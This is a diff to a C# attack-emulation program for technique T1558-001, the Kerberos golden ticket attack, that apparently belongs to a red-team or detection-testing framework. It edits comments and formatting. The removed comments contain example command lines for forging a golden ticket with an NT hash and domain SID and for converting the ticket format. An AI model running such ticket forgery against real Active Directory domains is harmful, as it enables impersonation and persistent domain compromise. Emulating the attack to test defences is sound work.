@@ -68,7 +68,7 @@ class Technique
             Console.WriteLine("[T1558-001] Failed extracting the zip files, maybe they were deleted.\n" + e);
         }
 
-        //execute golden with the command - gold.exe -nthash 4031b5ae4b9defa1f411f26610493e0c -domain-sid S-1-5-21-126282473-2140987555-3925513934 -domain Win2016.local baduser
+        //generate the golden ticket
         try
         {
             Console.WriteLine("[T1558-001] Generating Golden Ticket File with Ticketer.");
@@ -94,7 +94,7 @@ class Technique
             Console.WriteLine("[T1558-001] Failed executing ticketer, could not create the golden ticket.\n" + e);
         }
 
-        //execute convert with the command - convert.exe .\baduser.ccache .\baduser.kirbi
+        //convert the golden ticket from ccache to kirbi
         try
         {
             Console.WriteLine("[T1558-001] Converting the ticket from CCache to Kirbi.");
@@ -147,12 +147,10 @@ class Technique
 	{
 		Console.WriteLine("[T1558-001] Starting Execution!");
 		Console.WriteLine("[T1558-001] Generating golden ticket for user ID "+args[3]+" on domain \""+args[2]+"\".");
-		if (execCommand(args))
-		{
+		if (execCommand(args)){
 			Console.WriteLine("[T1558-001] Successfully executed Technique (return 0)! ");
 		}
-		else
-		{
+		else{
 			Console.WriteLine("[T1558-001] Oops, something went wrong! ");
 		}
 	}
